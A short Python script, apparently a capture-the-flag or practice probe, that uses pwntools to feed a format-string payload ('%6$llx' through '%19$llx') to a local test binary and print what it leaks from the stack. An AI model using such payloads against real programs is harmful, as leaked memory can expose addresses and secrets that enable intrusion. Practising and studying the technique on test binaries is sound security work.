from pwn import *

proc = process('./test/main2')

payload = ''.join(f'%{i}$llx ' for i in range(6, 20)).encode('utf-8')

proc.sendline(payload)

bs = proc.recvall()

print(bs)